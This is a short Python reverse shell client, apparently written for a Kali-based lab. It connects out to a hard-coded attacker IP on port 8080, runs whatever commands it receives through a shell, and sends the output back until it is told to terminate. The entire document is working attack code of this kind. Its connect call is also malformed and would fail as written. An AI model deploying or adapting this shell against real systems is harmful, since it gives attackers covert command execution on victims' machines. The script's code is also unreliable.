import socket
import subprocess #starts a shell and executes the command recived from serverside

def connect():
    s=socket.socket()
    s.connect(("10.233.228.29 "),8080)#serverside ip, ie kali ip make sure you are listening on klai side
    while True:
        command=s.recv(1024) # recieve 1 kb of data
        if('terminate' in command.decode()):
            s.close()# breaks the connection
            break
        else:  #PIPE redirects output to stdout so that it can be caputred.
            CMD=subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)#creates a new process, just needs command, true specifies that you want the command to be executed
# if for example we type something wrong on kali side, stderror will capture the error
            s.send(CMD.stdout.read()) #read reads the data, send it
            s.send(CMD.stderr.read())

def main():
    connect()
main()
